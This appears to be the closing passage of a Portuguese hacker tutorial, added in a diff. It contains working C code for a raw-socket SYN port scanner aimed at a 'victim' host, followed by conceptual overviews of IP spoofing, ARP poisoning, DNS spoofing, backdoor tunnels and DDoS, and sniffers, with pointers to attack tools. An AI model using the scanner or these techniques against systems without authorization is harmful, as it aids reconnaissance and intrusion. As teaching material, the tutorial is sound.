+/*  SYN SCANNER - Scaneia as portas de um host em modo "half-open".
+    Desenvolvido por Nash Leon vulgo coracaodeleao.
+    nashleon@yahoo.com.br
+    Agradecimentos ao Unsekurity Team.
+    http://unsekurity.virtualave.net
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <netdb.h>
+
+#define PORTA_INICIAL      1
+#define PORTA_FINAL     7000
+
+int scaneador(unsigned short porta, unsigned int hacker, unsigned int
+vitima);
+unsigned short in_cksum (unsigned short *end, int tamanho);
+void alarm_handler(int i);
+
+int tempo_esgotado = 0;
+
+main(int argc, char *argv[])
+{
+unsigned short portas;
+unsigned int porta_inicial, porta_final;
+struct servent *servico;
+
+if(argc == 1) {
+printf("***************************************************************\n");
+printf("************ SYN SCAN - DESENVOLVIDO POR NASH LEON ************\n");
+printf("***************************************************************\n");
+printf("\nUso: %s <ip_local> <ip_vitima> <porta_inicial> <porta_final>\n",argv[0]);
+exit(0);
+}
+if(geteuid() != 0) {
+fprintf(stderr,"Amigo, voce necessita ser root!!\n");
+fprintf(stderr,"Essas estruturas(RAW SOCKET) necessitam disso!!\n");
+fprintf(stderr,"Sinto muito amigo.\nParando execucao!!\n\n");
+exit(1);
+}
+if (argc > 2)
+{
+  porta_inicial = (PORTA_INICIAL);
+  porta_final = (PORTA_FINAL);
+}
+if (argc > 3)
+{
+  porta_inicial =  atoi(argv[3]);
+  porta_final = atoi (argv[4]);
+}
+for(portas = porta_inicial; portas < porta_final; portas++){
+if(scaneador(portas, inet_addr(argv[1]), inet_addr(argv[2]))==1){
+servico = getservbyport(htons(portas),"tcp");
+printf("A porta %d esta aberta mano!! O Servico eh [%s]\n",portas,(servico
+== NULL) ? "Desconhecido" : servico-> s_name);
+}
+}
+return 0;
+}
+int scaneador(unsigned short porta, unsigned int hacker, unsigned int vitima)
+{
+   struct tcphdr meu_tcp;
+   struct recv_tcp {
+      struct iphdr ip;
+      struct tcphdr tcp;
+      unsigned char blah[65535];
+   } recv_tcp;
+
+   struct pseudo_header {
+      unsigned int source_address;
+      unsigned int dest_address;
+      unsigned char placeholder;
+      unsigned char protocol;
+      unsigned short tcp_length;
+      struct tcphdr tcp;
+   }pseudo_header;
+
+   int Meusocket;
+   struct sockaddr_in alvo;
+   int tam_alvo;
+   static int blah = 0;
+
+   blah++;
+meu_tcp.source = getpid() + blah;
+meu_tcp.dest = htons(porta);
+meu_tcp.seq = getpid() + blah;
+meu_tcp.ack_seq = 0;
+meu_tcp.res1 = 0;
+meu_tcp.doff = 5;
+meu_tcp.res2 = 0;
+meu_tcp.fin = 0;
+meu_tcp.syn = 1; /* o bit syn aqui eh ligado! */
+meu_tcp.rst = 0;
+meu_tcp.psh = 0;
+meu_tcp.ack = 0;
+meu_tcp.urg = 0;
+meu_tcp.window = htons(512);
+meu_tcp.check = 0;
+meu_tcp.urg_ptr = 0;
+
+pseudo_header.source_address = hacker;
+pseudo_header.dest_address = vitima;
+pseudo_header.placeholder = 0;
+
+pseudo_header.protocol = IPPROTO_TCP;
+pseudo_header.tcp_length = htons(20);
+bcopy(&meu_tcp, &pseudo_header.tcp, 20);
+meu_tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
+
+alvo.sin_family = AF_INET;
+alvo.sin_port = htons(porta);
+alvo.sin_addr.s_addr = vitima;
+tam_alvo=sizeof(alvo);
+
+signal(SIGALRM, alarm_handler);
+
+Meusocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+if(Meusocket < 0)
+{
+ fprintf(stderr, "Nao pode abrir raw socket!\n");
+ exit(1);
+}
+
+sendto(Meusocket, &meu_tcp, 20, 0, (struct sockaddr *)&alvo,tam_alvo);
+tempo_esgotado = 0;
+alarm(10);
+while(1)
+{
+read(Meusocket, (struct recv_tcp *)&recv_tcp, 65535);
+if(tempo_esgotado == 1) {
+close(Meusocket);
+tempo_esgotado=0;
+return -1;
+}
+if(recv_tcp.tcp.dest == (getpid() + blah)){
+alarm(0);
+close(Meusocket);
+if(recv_tcp.tcp.rst == 1) return 0;
+else return 1;
+  }
+ }
+}
+
+/* Checksum */
+
+unsigned short in_cksum(unsigned short *end, int tamanho)
+{
+register long           sum;
+u_short                 oddbyte;
+register u_short        answer;
+
+sum = 0;
+while (tamanho > 1)  {
+sum += *end++;
+tamanho -= 2;
+ }
+if (tamanho == 1) {
+oddbyte = 0;
+*((u_char *) &oddbyte) = *(u_char *)end;
+sum += oddbyte;
+}
+
+sum  = (sum >> 16) + (sum & 0xffff);
+sum += (sum >> 16);
+answer = ~sum;
+return(answer);
+}
+
+void alarm_handler (int i)
+{
+   alarm(0);
+   tempo_esgotado = 1;
+}
+
+------------------------------------------------------------------------
+
+Aih estah mais um scanner.Estou desenvolvendo um udp scan que se usa de
+respostas via ICMP, mas ainda nao serah disponibilizado nesse tutorial.
+Creio que o super-basico sobre RAW SOCKS e UDP SOCKS jah estah disponivel
+aqui, em breve darei continuidade a estas materias, ainda tem muita coisa
+pendente, pegue os links e mande brasa nos seus proprios esquemas,eh
+possivel se fazer muita coisa com o que descrevi aqui.Espero mesmo que
+isso tudo venha a ser util a alguem, quanto ao exemplo de scanner, ele eh
+um half-open, se aproveita do hand-shake(aperto de maos) do TCP, ele corta
+a conexao no meio do processo, logo eh de facil deteccao e logacao(gravacao).
+Seu uso nao eh recomendado, estah somente para propositos educacionais.
+Existem scanners melhor que este, em breve disponibilizaremos mais
+informacoes sobre isso, por enquanto, melhor para voce eh usar o nmap..:)
+
+----------------------------------------------------------------
+6 - TEORIAS BASICAS INTRODUTORIAS DE ALGUMAS TECNICAS AVANCADAS |
+----------------------------------------------------------------
+
+Irei nesse item descrever de forma basica, teorias, nao pretendo me
+aprofundar nesses assuntos, pois de fato, nao sao assuntos faceis de
+se aprender e de se ensinar, como escrevo para NewBies, nao me excluindo
+deles, sim, me considero um NewBie, irei somente descrever do que se 
+trata cada uma dessas tecnicas e caso se interesse, voce poderah consultar
+alguns links e referencias sobre estas materias, no final desse txt.
+De ante-mao digo que esses assuntos sao pouco abordados e ainda existem
+diversas praticas dessas teorias ainda "ocultas", que pouca gente conhece.
+Sao formas novas de se aplicarem estas tecnicas, com objetivos bem
+variados.Sei que muita gente se interessa por essas materias, em especial
+IP SPOOF, que atingiu uma fama consideravel, espero que este item seja
+util para voce, se eh elite, nao leia, voce jah deve saber tudo que irei
+descrever abaixo!
+
+
+6.1 - IP SPOOF 
+---------------
+
+Essa tecnica eh muito falada, muita gente jah ouviu falar sobre isso,
+ouviram que mitnick a usou para ter acesso a determinado servidor, que
+com ela eh possivel muitas, e muitas coisas,mas no entanto sao poucos os
+que de fato a compreendem e muito pouco os que a executam.Da-se o nome de
+IP SPOOF a uma tecnica que basicamente consiste em enviar pacotes IP como
+se fosse um outro host(Pacotes com os cabecalhos forjados), enganando
+os servidores e ateh mesmo alguns firewalls em busca de determinados
+objetivos.Essa tecnica realmente se popularizou apos divulgarem que
+Mitnick possivelmente a usou, a realidade eh que nao sabemos de fato se
+ele a fez ou nao, pois ele foi pego como bode espiatorio, logo, tudo que
+disseram a respeito dele pode ser mentira, creio que os conhecimentos que
+ele possui ou possuia, davam a ele este privilegio ou azar, de ser acusado
+de ter executado com exito esta tecnica.
+A possivel tecnica usa por Mitnick se denomina "Blind Spoof", irei num futuro
+breve descrever algo sobre ela,mas por enquanto, ficaremos somente na
+teoria das tecnicas mais simples de IP Spoof.
+Bom, creio que nao ha muito para explicar, IP SPOOF eh uma tecnica que
+consiste em alterar os cabecalhos de um datagrama IP para enganar quanto
+a origem dos pacotes(Mentir sobre o IP de Origem).Um vez alterado o
+cabecalho, a vitima entenderah que um determinado pacote eh proveniente de
+um determinado IP(que foi forjado por voce).Em alguns casos, eh possivel,
+enviar comandos, pacotes, etc para redes "fechadas".
+Brevemente iremos descrever mais coisas sobre isso, por enquanto, de uma
+olhada na phrack(www.phrack.com) de numero 48 com o topico "IP-spoofing
+Demystified", que descreve a tecnica usada por mitnick.De uma olhada
+tambem no codigo fonte dos seguintes arquivos da w00w00(www.w00w00.org):
+rsh.c ; spoof.c ; e syn.c ; Vasculhe o site deles que lah tem.
+
+6.2 - ARP POISONING 
+--------------------
+
+Nosso tutorial jah estah gigante, e foge ao objetivo deste tutorial
+descrever coisas mais complexas, lembrando que meu objetivo eh o pessoal
+Newbie.Irei somente descrever o basico para que voce tenha uma ideia do
+que eh isso, creio que em breve alguem deve estar soltando mais material
+sobre isso, porque esta tecnica eh bastante interessante, principalmente
+para o pessoal que possui acesso local a alguma maquina, as vantagens de
+se usar isso sao inumeras, de qualquer forma descreverei brevemente do
+que se trata esta tecnica.
+Vimos lah em cima na parte de Protocolos que o protocolo denominado ARP
+eh usado para remapear enderecos IP em enderecos fisicos de rede(MAC), 
+sabendo disso, o fucador forca a entrada de seu endereco MAC(da sua placa
+de rede) nas tabelas de roteamento do servidor alvo, uma vez conseguido 
+isso, ele passa a redirecionar os pacotes que esta rede receberia, para
+sua propria maquina(isso poderia incluir senhas e dados "sigilosos",
+dentre outros).Mais material sobre isso pode ser encontrado em:
+No zine keen veracity de numero 7, voce pode baixa-lo em:
+Procure no site www.hackersclub.com na parte de Underground Zines.
+De uma olhada tambem no programa farpce.pl do stderr, procure em:
+http://stderr.sekure.org/ 
+Dentre diversos outros txt que tem net a fora.
+
+
+6.3 - DNS SPOOF 
+----------------
+
+Spofar um dominio, este eh o objetivo desta tecnica, e varios sao os
+possiveis metodos de se obter isto.DNS SPOOF eh muito usado em virtual
+hosts(vhosts) por pessoas que se conectam em IRC.Eh muito comum vermos
+alguem com www.eu.sou.super.hacker.org circulando no IRC.Existem diversas
+formas de se fazer isto, mas as limitacoes tambem sao diversas.Mas a
+pratica mais util de DNS SPOOF consiste em spoofar um dominio e depois
+redireciona-lo para um determinado endereco.Isso mesmo amigo, algum
+tempo atras um grupo de (nao sei se chamo hackers, ou crackers), mas um
+grupo de pessoas que manjavam da coisa,inclusive com brasileiros entre
+eles,portugueses e etc, sequestraram durante mais de 1 semana,se nao me
+engano, o dominio www.fbi.gov, fazendo toda a internet tremer.
+A tecnica que eles usaram nao foi divulgada,mas desconfia-se que nao
+eh coisa nova,talvez tenha sido DNS ID SPOOF, nao sei.De qualquer forma,
+DNS HIJACKING e DNS SPOOF sao tecnicas ainda muito usadas.
+Se quer mais material sobre isso procure de uma lida nesse txt:
+http://ADM.freelsd.net/ADM/ADMID.txt
+Existe mais materiais sobre DNS Spoof, DNS Hijacking e etc.
+
+6.4 - TUNEIS 
+-------------
+
+Essa Tecnica eh muito interessante, e muito abrangente.Os tuneis sao
+canais que ligam o invasor ou atacante a uma ou diversas maquinas no
+intuito de negociar(enviar e/ou receber) pacotes com ela.Geralmente se
+referem aos tuneis como sendo usados em backdoors.Essas backdoors permitem
+ao atacante enviar dados em determinados protocolos(ICMP,UDP,IP,..) para a
+maquina com intuito de executar determinada tarefa.Com esse conceito, 
+voce pode ateh mesmo considerar os atuais DDoSes como sendo 
+uma especie de tunel, mas o conceito de tunel pode ser mais abrangente.
+Vejamos um esquema para os DDoSes:
+
+
+				 -----------------
+				| Maquina q serah |
+				|    derrubada    |
+			  /	 ----------------- 
+			/               / \	      \
+		      /                  |		\
+		    /                    |		  \
+	 ------------		 -----------------       ------------
+	| Backdoor 1 | 		|    Backdoor 2	  |	| Backdoor 3 |
+         ------------		 -----------------	 ------------
+		     \			                   /
+		       \		 |		 /
+			 \		 |	       /
+			   \		 |	     /
+			     \		 |	   /
+			       \	 |       /
+				 -----------------
+				|Master ou Zoombie|
+				 -----------------
+					 |
+					 |
+					 |
+					 | 
+					 |
+			         -----------------
+				|Servidor Invadido|
+				 -----------------
+					 |
+					 |
+					 | -> Tunel propriamente dito.
+					 |    (Exemplo: TCP Shell ou
+					 |     UDP Shell).
+				 ----------------
+			        |     Maquina    |
+				|   do Atacante  |
+				 ----------------
+
+Nao creio que a maioria dos ataques que envolveram DDoS seguissem o
+esquema acima, pois as chances de se chegar a maquina real do atacante
+seriam consideradas bastante remotas.Coloquei este esquema para evidenciar
+o tunelamento e o tunel em sih.Existem varios esquemas, principalmente
+usando backdoor e tecnicas avancadas de scaneamento(Multiplos IPs), mas
+esses conceito eh abrangente, pode ser usado em diversas tecnicas
+conjuntas, vale a criatividade do fucador.
+Na home page do Unsekurity Team existe um tutorial sobre icmp tunel do
+module, vale uma conferida.
+De qualquer forma, tenha em mente que o tunel, eh um canal entre um
+host vitima e um host atacante que tenta burlar um firewall ou prove
+acesso direto entre as duas maquinas.
+
+
+6.5 - SNIFFERS
+---------------
+
+Sniffers sao programas designados com intuitos de farejar, escutar(gravar)
+determinados pacotes de determinados protocolos.Geralmente se usa sniffers
+para logar um determinado servico ou protocolo em busca de capturar algumas
+senhas ou pacotes importantes(Crackers visam numero de cartoes de credito).
+Sao varios os tipos de sniffers, sendo mais comum sniffers sendo executado
+em hosts locais capturando senhas em modo texto.Mas tambem existem sniffers
+"externos" ou remotos, que se localizam em um determinado gateway ou na
+rota de envio de pacotes de uma rede capturando pacotes de uma determinada
+rede.Daih vem a grande necessidade de se usar criptografia forte no envio
+de dados(numeros de cartao de credito, senhas, documentos importantes) pela
+internet.Existem projetos de governos e de grande corporacoes que se utilizam
+de sniffers para interceptar dados e informacoes de determinados usuarios.
+A tecnica utilizada por esses programas(sniffers) resume-se basicamente nas
+possiveis vulnerabilidades dos algoritmos de roteamento.Um sniffer, as vezes,
+eh capaz de capturar centenas de senhas em modo limpo(sem criptografia) em
+uma rede local.Um administrador de rede precisa estar sempre apto e possuir
+muitos conhecimentos de interfaces de redes, bem como de protocolos de
+comunicacao e transferencia, pois os sniffers representam uma seria ameaca
+a toda e qualquer tipo de rede.Dois bons faqs explicando como sao feitos e
+o que sao esses sniffers seguem nos links abaixo:
+
+http://www.attrition.org/~modify/texts/faqs/sniffer-faq.txt
+http://iss.net/
+
+Sendo que o primeiro link possui um excelente FAQ introdutorio.Vale com
+certeza uma lida.
+
+6.6 - OUTRAS
+-------------
+
+Existem diversas outras tecnicas muito usadas por fucadores com o uso de
+sockets para atingir determinados objetivos.Procure informacoes sobre 
+Brutal Forces,IP e DNS Hijacking, Remote Buffer Overflows, Denial of
+Services, Backdoors(Tuneis e Bindagem de Shells),etc, etc, etc..
+
+--------------
+7. TERMINANDO |
+--------------
+
+Ultimas Palavras.
+
+7.1 Links e Referencias
+------------------------
+
+Destaque para o livro "Arquitetura de Redes de Computadores - OSI e TCP/IP".
+Segunda Edicao da MAKRON Books.
+
+* ALGUNS LINKS SOBRE PROGRAMACAO DE SOCKETS
+
+http://www.lowtek.com/sockets/
+http://www.ecst.csuchico.edu/~beej/guide/ne
+http://www.auroraonline.com/sock-faq
+http://kipper.york.ac.uk/~vic/sock-faq
+http://packetstorm.securify.com/programming-tutorials/Sockets/
+http://www.lcg.org/sock-faq
+
+* LINK AONDE VOCE PODE ACHAR QUALQUER RFC(Request For Comments)
+
+http://www.rfc-editor.org/
+
+* INFORMACOES SOBRE IPv6
+
+http://www.ipv6.org
+
+* BONS LINKS COM BONS MATERIAIS FUCADORES E DE SEGURANCA
+
+http://www.w00w00.org/
+http://adm.isp.at/
+http://www.l0pht.com/
+http://packetstorm.securify.com
+http://www.securityfocus.com/
+
+7.2 - Consideracoes Finais
+---------------------------
+
+Terminado mais um tutorial, com varios a caminho.Espero que tudo isto
+venha a ser util para alguem.Gostaria de agradecer ao pessoal que de uma
+forma ou de outra tem se aproximado para trocar informacoes, nao soh
+comigo, mas com o grupo todo, creio que eh por aih que as coisas caminham,
+eh impossivel alguem possuir dominio sobre todas as possiveis atividades
+fucadoras, bem como de informatica em geral.Ainda ha muito p/ aprender, e
+quanto mais eu aprendo, mais sei que tem muito mais ainda para aprender.
+Esse tutorial foi bastante teorico, eu sei o quanto eh importante a teoria,
+pois o que seria da pratica sem a teoria?? Espero nos proximos poder
+avancar mais, pois deverah estar jah divulgado o tutorial sobre IPC,
+assim, um monte de programas poderao ser publicados, pois seu entendimento
+serah bastante facilitado.Creio que sem mais por enquanto,sem manifestos
+tambem, creio que a "pseudo-elite" aos poucos vai tomando conciencia de
+seu devido lugar.A voce amigo, NewBie, tenha conciencia!!Juizo!!Sempre!!
+
+						Nash Leon.
+
+----------------------------------EOF-------------------------------------
+
